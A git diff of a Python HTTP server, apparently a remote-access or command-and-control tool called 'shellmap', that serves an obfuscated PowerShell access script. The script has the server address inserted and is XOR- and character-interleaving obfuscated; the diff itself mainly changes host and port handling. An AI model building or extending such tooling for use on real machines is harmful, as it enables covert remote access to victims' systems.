@@ -16,7 +16,7 @@ import re
 
 # load module names and file paths as tuples
 module_files = [ (Path(f.path).stem, f.path) for f in os.scandir(os.path.join(os.getcwd(), "modules")) if f.is_file() ]
-server_address = "127.0.0.1"
+server_address = "http://127.0.0.1:8000"
 
 def encode(data: str) -> str:
     # key for XOR encoding is current minute
@@ -360,7 +360,7 @@ class RequestHandler(BaseHTTPRequestHandler):
 
         with open("access_script.ps1", 'r') as f:
             tmp_str = f.read()
-        tmp_str = tmp_str.replace('IP_ADDR_HERE', server_address)
+        tmp_str = tmp_str.replace('HOST_HERE', server_address)
         for char in tmp_str:
             self.getter_script += char
             self.getter_script += alphabet[i%len(alphabet)]
@@ -400,10 +400,12 @@ def run_server(server_class=HTTPServer, handler_class=RequestHandler, port=8000)
 
 
 if __name__ == "__main__":
-    import pdb
+    # argument syntax
+    # ./server.py [URL user should send queries to] [optional port that shellmap should use]
+    port_num = 8000
     if len(sys.argv) > 1:
         try:
-            server_host = urlparse("http://" + sys.argv[1])
+            server_host = urlparse(sys.argv[1])
             if len(server_host.netloc) > 0:
                 server_address = server_host.netloc
             else:
@@ -411,7 +413,12 @@ if __name__ == "__main__":
         except:
             print(f"Invalid host IP address {sys.argv[1]}, exiting")
             exit(1)
+    if len(sys.argv) > 2:
+        try:
+            port_num = int(sys.argv[2])
+        except:
+            print(f"Invalid port number, using default {port_num}")
     try:
-        run_server()
+        run_server(port=port_num)
     except Exception as e:
         print(f"Encountered an exception: {e}")
